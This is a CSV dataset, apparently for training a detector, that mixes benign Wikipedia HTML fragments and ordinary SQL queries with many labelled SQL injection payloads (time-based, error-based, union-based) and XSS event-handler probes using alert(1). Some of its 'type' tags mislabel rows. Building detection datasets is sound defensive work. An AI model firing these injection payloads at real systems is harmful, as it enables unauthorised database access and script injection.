Text,Label,type
SELECT tool ( s )  FROM list SELECT exact ( s ) ,0,sql
"The most extreme form of this argument (the brain replacement scenario) was put forward by <a href=""/wiki/Clark_Glymour"" title=""Clark Glymour"">Clark Glymour </a> in the mid-1970s and was touched on by <a href=""/wiki/Zenon_Pylyshyn"" title=""Zenon Pylyshyn"">Zenon Pylyshyn </a> and <a href=""/wiki/John_Searle"" title=""John Searle"">John Searle </a> in 1980. ",0,xss
"<keygen draggable=""true"" ondragstart=""alert(1)"">test</keygen>",2,xss
baqu,0,xss
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1,sql
"<li class=""toclevel-2 tocsection-12""><a href=""#Social_intelligence""><span class=""tocnumber"">4.8 ",0,xss
"<li><cite id=""CITEREFLaw1994"" class=""citation techreport"">Law, Diane (June 1994). <i>Searle, Subsymbolic Functionalism and Synthetic Intelligence </i> (Technical report). University of Texas at Austin. p.&#160;AI94-222. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.38.8384"">10.1.1.38.8384 </a> ",0,xss
SELECT * FROM food,0,sql
"<li><a href=""/wiki/Automata_theory"" title=""Automata theory"">Automata theory </a> </li>",0,xss
patten,0,sql
"<ul><li><a href=""/wiki/E-commerce"" title=""E-commerce"">E-commerce </a> </li>",0,xss
SELECT trade ( s )  FROM official UNION ALL,0,sql
",s",1,sql
"<s onmouseout=""alert(1)"">test</s>",2,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",2,xss
dangers9@paremoselalzheimer.az,0,sql
<frameset onpointerenter=alert(1)>XSS</frameset>,2,xss
"<var onmouseup=""alert(1)"">test</var>",2,xss
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
SELECT * FROM  ( SELECT moon FROM human ) ,0,xss
"calle garci-perez 41, 9?c",0,sql
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1,xss
SELECT AVG ( sign ) FROM burn,0,sql
navas de san juan,0,xss
1'  )   where 6842  =  6842,1,xss
"   SELECT Employees.level, COUNT ( Orders.additionID )  AS circusFROM    ( OrdersINNER JOIN service ON Orders.southID  =  Employees.stairsID ) ",0,sql
"<li id=""cite_note-AI_at_Stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Stanford_in_the_60s_161-0"">^ </a> </b> ",0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"	 </span> <span class=""reference-text"">Wendell Wallach (2010). <i>Moral Machines </i>, Oxford University Press. ",0,xss
DELETE FROM dust,0,sql
"   SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",0,sql
"<li><cite id=""CITEREFNRC1999"" class=""citation book""><a href=""/wiki/United_States_National_Research_Council"" class=""mw-redirect"" title=""United States National Research Council"">NRC (United States National Research Council) </a> (1999). ""Developments in Artificial Intelligence"". <i>Funding a Revolution: Government Support for Computing Research </i>. National Academy Press. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Developments+in+Artificial+Intelligence&amp;rft.btitle=Funding+a+Revolution%3A+Government+Support+for+Computing+Research&amp;rft.pub=National+Academy+Press&amp;rft.date=1999&amp;rft.au=NRC+%28United+States+National+Research+Council%29&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",2,xss
SELECT TOP 3 * FROM rhythm SELECT * FROM purpose 3SELECT * FROM supply,0,sql
"1""  )   where 9499  =  9499",1,sql
riggsbee,0,xss
SELECT AVG ( buy ) FROM equally SELECT SUM ( interior ) ,0,sql
"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",2,xss
SELECT * FROM are WHERE bush = 'particular'  OR metal = 'party',0,sql
<svg><noframes onload=alert(1)></noframes>,2,xss
corb9ch4da,0,sql
"		<img alt=""Page protected with pending changes"" src=""//upload.wikimedia.org/wikipedia/en/thumb/b/b7/Pending-protection-shackle.svg/20px-Pending-protection-shackle.svg.png"" decoding=""async"" width=""20"" height=""20"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/b/b7/Pending-protection-shackle.svg/30px-Pending-protection-shackle.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/b/b7/Pending-protection-shackle.svg/40px-Pending-protection-shackle.svg.png 2x"" data-file-width=""512"" data-file-height=""512"" /> ",0,xss
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
cegajoso,0,sql
"  SELECT FORMAT ( 250500.5634, 0 ) ;",0,xss
" 	<sup id=""cite_ref-Emotion_and_affective_computing_144-0"" class=""reference""><a href=""#cite_note-Emotion_and_affective_computing-144"">&#91;141&#93; </a> </sup> Similarly, some <a href=""/wiki/Virtual_assistant"" title=""Virtual assistant"">virtual assistants </a> are programmed to speak conversationally or even to banter humorously; this tends to give naïve users an unrealistic conception of how intelligent existing computer agents actually are.<sup id=""cite_ref-145"" class=""reference""><a href=""#cite_note-145"">&#91;142&#93; </a> </sup>",0,xss
<output onpointerout=alert(1)>XSS</output>,2,xss
"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",2,xss
FROM  ( SELECT DISTINCT area FROM take ) ,0,sql
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) ,0,sql
29?em2ti3a,0,sql
SELECT balloon ( s )  FROM correctly,0,sql
" SELECT column_name ( s )  FROM tube,would",0,sql
-5031' or 9323  =  9323#,1,sql
"-9569%'   )    )    union all select 8405,8405,8405,8405--",1,xss
"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,xss
rupp@djbroadcast.gov,0,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Cybernetics"" title=""Cybernetics"">Cybernetics </a> and <a href=""/wiki/Computational_neuroscience"" title=""Computational neuroscience"">Computational neuroscience </a> </div>",0,xss
SELECT * FROM butter WHERE spent = 'want'  OR court = 'very',0,sql
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",1,xss
"   SELECT Employees.gentle, COUNT ( Orders.likelyID )  AS roughFROM    ( OrdersINNER JOIN powder ON Orders.cityID  =  Employees.starID ) ",0,sql
"<ul><li><a href=""/wiki/3D_optical_data_storage"" title=""3D optical data storage"">3D optical data storage </a> </li>",0,xss
otowa@ebuy.com.ci,0,sql
<set onpointerup=alert(1)>XSS</set>,2,xss
"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>",2,xss
o1e6e2d6,0,sql
<dd onpointerup=alert(1)>XSS</dd>,2,xss
sellees,0,xss
	 </span></a></dt><dd>Learn how to use Python’s builtin logging on Scrapy.</dd>,0,xss
" SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;",0,xss
"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
"1'+  (  select rdpe where 6553  =  6553 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",1,sql
 </li>,0,xss
"<li><cite id=""CITEREFHernandez-OralloDowe2010"" class=""citation journal"">Hernandez-Orallo, J.; Dowe, D. L. (2010). ""Measuring Universal Intelligence: Towards an Anytime Intelligence Test"". <i>Artificial Intelligence </i>. <b>174 </b> (18): 1508–1539. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.295.9079"">10.1.1.295.9079 </a> ",0,xss
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1,sql
"<strong onmouseover=""alert(1)"">test</strong>",2,xss
"1' union all select null,null,null,null,null,null--",1,sql
piedramillera,0,sql
"avenida de europa 153,",0,sql
<body onfocusout=alert(1) id=x><iframe id=x>,2,xss
"jana, la",0,sql
angeliek,0,sql
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",2,xss
s4g51r,0,sql
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1,sql
"1%""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1,sql
"1'   )    )    as sojl where 8710  =  8710 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3078' LIMIT 1,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/autothrottle.html"">AutoThrottle extension</a></li>",0,xss
"callejon giron 124,",0,sql
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
vada,0,sql
darcy@google-movil.dz,0,sql
SELECT TOP 3 * FROM cloth WHERE people = 'officer',0,sql
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347696 )  ORDER BY meta_id ASC",0,sql
<svg><kbd onload=alert(1)></kbd>,2,xss
SELECT * FROM affect WHERE dirt = 'camp'  OR yellow = 'salmon',0,sql
<listing onpointerover=alert(1)>XSS</listing>,2,xss
15142,0,sql
1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +',1,sql
"1   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"  SELECT library,making,fed FROM spoken LEFT JOIN Orders ON slope.begunID =  lesson.transportation ORDER BY split.row",0,sql
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'uadr' like 'uadr",1,sql
"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
select   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  select 8916 from information_schema.character_sets  )   end  )  #,1,sql
SELECT * FROM race WHERE opportunity LIKE '%front%',0,sql
	 </span> </a> </li>,0,xss
"1 and make_set  (  9542  =  8888,8888  )  -- idkn",1,sql
"<strong onmouseout=""alert(1)"">test</strong>",2,xss
"1%""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""%""  =  """,1,xss
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></center>",2,xss
SELECT TOP 50 PERCENT * FROM terrible SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM view,0,xss
SELECT * FROM salt WHERE NOT stage = 'examine'  AND NOT day = 'alphabet',0,sql
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",0,xss
"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",2,xss
SELECT discovery ( s FROM kept RIGHT JOIN,0,sql
"<li><a href=""/wiki/Commensurability_(philosophy_of_science)"" title=""Commensurability (philosophy of science)"">Commensurability </a> </li>",0,xss
18653468p,0,sql
lotera,0,sql
"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",2,xss
3.79662E+15,0,xss
"<nobr draggable=""true"" ondragenter=""alert(1)"">test</nobr>",2,xss
SELECT COUNT ( grabbed ) FROM origin,0,sql
hoyt,0,xss
"pl. comercial 54, 5d",0,xss
<body id=x tabindex=1 onfocus=alert(1)></body>,2,xss
rigau amer,0,xss
"<ul><li><a href=""/wiki/Software_development_process"" title=""Software development process"">Software development process </a> </li>",0,xss
<th id=x tabindex=1 onfocusin=alert(1)></th>,2,xss
"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>",2,xss
" SELECT * FROM per ORDER BY straight ASC, trail DESC",0,xss
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><a href=""/wiki/Biocybernetics"" title=""Biocybernetics"">Biological cybernetics </a> </li>",0,xss
"<meta onkeypress=""alert(1)"" contenteditable>test</meta>",2,xss
"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1,sql
"<blockquote onmousemove=""alert(1)"">test</blockquote>",2,xss
"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
SELECT * FROM cake WHERE skill = 'bottom'  AND  ( strike = 'interior' OR aloud = 'couple' ) ,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886d67719' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
"    <input type=""hidden"" name=""check_keywords"" value=""yes"" />",0,xss
6572,0,xss
AI in early science fiction.,0,xss
zalzale1,0,xss
1  )   as afmb where 8665  =  8665 order by 1#,1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/loaders.html"">Item Loaders</a></li>",0,xss
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1,sql
"1' union all select null,null,null,null,null#",1,sql
<nextid onpointerleave=alert(1)>XSS</nextid>,2,xss
"1'||  (  select 'fpfl' from dual where 1434  =  1434 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,xss
SELECT * FROM damage WHERE telephone NOT BETWEEN 'than' AND 'fog',0,sql
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,xss
10650,0,xss
<dt onpointerout=alert(1)>XSS</dt>,2,xss
" SELECT * FROM rays ORDER BY couple ASC, highway DESC",0,xss
"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""tqbi""  =  ""tqbi",1,xss
santamarina,0,sql
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""uisi""  =  ""uisi",1,sql
SELECT * FROM possibly WHERE supply LIKE '%consider%',0,sql
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,sql
<output id=x tabindex=1 onfocusin=alert(1)></output>,2,xss
<animate onpointerenter=alert(1)>XSS</animate>,2,xss
SELECT COUNT ( DISTINCT letter )  FROM stock,0,xss
qerimi@graficascamp.bt,0,sql
68318279e,0,sql
"   SELECT bow, ago, tears FROM neighbor WHERE locate  IS NULL",0,xss
"<thead onclick=""alert(1)"">test</thead>",2,xss
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
SELECT City FROM Customers UNION ALL,0,sql
"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",2,xss
	 </span> </li>,0,xss
valeika@italianmotorvillagesevilla.gd,0,sql
SELECT * FROM people  WHERE gray NOT LIKE '[obtain]%',0,sql
sylvia,0,xss
"1"" where 2235  =  2235 union all select null,null,null,null,null--",1,sql
	 </span> </li>,0,xss
mcallum,0,sql
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",1,sql
SELECT TOP 3 * FROM organized,0,xss
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",1,xss
SELECT DISTINCT poet FROM observe,0,sql
1.35689E+15,0,sql
"<a href=""/wiki/Kernel_methods"" class=""mw-redirect"" title=""Kernel methods"">kernel methods </a> such as the <a href=""/wiki/Support_vector_machine"" class=""mw-redirect"" title=""Support vector machine"">support vector machine </a>:",0,xss
"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT AVG ( source ) FROM these,0,sql
SELECT * FROM region WHERE leg BETWEEN 'dance' AND 'such',0,sql
SELECT * FROM circus WHERE house = 'island' LIMIT 3,0,sql
gregescos,0,xss
"   SELECT COUNT ( basis ) , mysterious FROM dirt BY cent",0,sql
17773,0,sql
SELECT * FROM husband ORDER BY example DESC,0,sql
brenda,0,sql
"<li id=""cite_note-260""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-260"">^ </a> </b> ",0,xss
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",1,sql
1478,0,sql
1  )   as vqdh where 1603  =  1603,1,sql
"-3703""   )    )     )   union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1,xss
butkus@cpanelhost.com.uz,0,sql
<figure onpointerup=alert(1)>XSS</figure>,2,xss
33rb0rr55ada,0,sql
SELECT AVG ( bat ) FROM earn,0,sql
	 </span> </li>,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sup>",2,xss
SELECT friend ( s FROM month RIGHT JOIN,0,xss
      </dl>,0,xss
1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,1,sql
" SELECT * FROM official ORDER BY corn ASC, taken DESC",0,sql
"<track onmouseenter=""alert(1)"">test</track>",2,xss
"<table class=""vertical-navbox nowraplinks"" style=""float:right;clear:right;width:22.0em;margin:0 0 1.0em 1.0em;background:#f9f9f9;border:1px solid #aaa;padding:0.2em;border-spacing:0.4em 0;text-align:center;line-height:1.4em;font-size:88%;width: 16em;""><tbody><tr><th style=""padding:0.2em 0.4em 0.2em;font-size:145%;line-height:1.2em"">",0,xss
"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",2,xss
SELECT * FROM welcome WHERE NOT eat = 'family'  AND NOT prove = 'explanation',0,xss
<p onpointerover=alert(1)>XSS</p>,2,xss
"  SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )  ",0,sql
"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,sql
pola,0,sql
"<h3><span class=""mw-headline"" id=""Symbolic"">Symbolic ",0,xss
"<q oncut=""alert(1)"" contenteditable>test</q>",2,xss
 ,0,xss
"admin""or 1  =  1 or """"  =  """,1,xss
vencilln,0,sql
1.26952E+15,0,sql
"<ul><li><a href=""/wiki/Non-physical_entity"" title=""Non-physical entity"">Non-physical entity </a> </li> </ul> </li>",0,xss
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,sql
SELECT TOP 3 * FROM twenty WHERE word = 'research',0,xss
"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
	 </span> ,0,xss
SELECT * FROM clothes WHERE parent = 'direction'  AND  ( pencil = 'heavy' OR matter = 'parts' ) ,0,xss
28221877a,0,sql
parke antonio trueba 175,0,sql
"<p>Computationalism is the position in the <a href=""/wiki/Philosophy_of_mind"" title=""Philosophy of mind"">philosophy of mind </a> that the human mind or the human brain (or both) is an information processing system and that thinking is a form of computing.<sup id=""cite_ref-403"" class=""reference""><a href=""#cite_note-403"">&#91;391&#93; </a> </sup> Computationalism argues that the relationship between mind and body is similar or identical to the relationship between software and hardware and thus may be a solution to the <a href=""/wiki/Mind-body_problem"" class=""mw-redirect"" title=""Mind-body problem"">mind-body problem </a>. This philosophical position was inspired by the work of AI researchers and cognitive scientists in the 1960s and was originally proposed by philosophers <a href=""/wiki/Jerry_Fodor"" title=""Jerry Fodor"">Jerry Fodor </a> and <a href=""/wiki/Hilary_Putnam"" title=""Hilary Putnam"">Hilary Putnam </a>.",0,xss
"   SELECT mouse, desk, bat FROM apartment WHERE late  IS NULL",0,sql
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></textarea>",2,xss
"<ul><li><a href=""/wiki/Model_of_computation"" title=""Model of computation"">Model of computation </a> </li>",0,xss
"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",1,xss
pearce,0,sql
"1',  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1,sql
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",1,sql
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0,xss
SELECT COUNT ( pride ) FROM adjective,0,sql
"<li><cite id=""CITEREFMcCarthyHayes1969"" class=""citation journal""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy, John </a>; Hayes, P. J. (1969). <a rel=""nofollow"" class=""external text"" href=""http://www-formal.stanford.edu/jmc/mcchay69.html"">""Some philosophical problems from the standpoint of artificial intelligence"" </a>. <i>Machine Intelligence </i>. <b>4 </b>: 463–502. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.85.5082"">10.1.1.85.5082 </a> ",0,xss
camio canexa 161 11?g,0,xss
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  367537 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish' OR wp_posts.post_status  =  'trash'  )  )   ORDER BY wp_posts.menu_order ASC,0,sql
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""pebw"" like ""pebw",1,sql
"1""  )   where 6897  =  6897",1,sql
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20,0,sql
1'  )   where 8086  =  8086 and 1430  =  7941--,1,xss
-5291'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'tmpm'  =  'tmpm,1,sql
-8264%'  )   order by 1#,1,sql
casasola de arin,0,sql
"<li id=""cite_note-Biological_intelligence_vs._intelligence_in_general-16""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Biological_intelligence_vs._intelligence_in_general_16-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Biological_intelligence_vs._intelligence_in_general_16-2""><sup><i><b>c </b> </i> </sup> </a> ",0,xss
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,sql
"   SELECT after,magic,trunk,principal,proud     (  (  jar JOIN can ON orbit.shut =  clean.us )   INNER JOIN storyON Orders.develop =  consider.worriedID ) ",0,sql
"<li><a href=""/wiki/Multithreading_(computer_architecture)"" title=""Multithreading (computer architecture)"">Multithreading </a> </li>",0,xss
"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sql
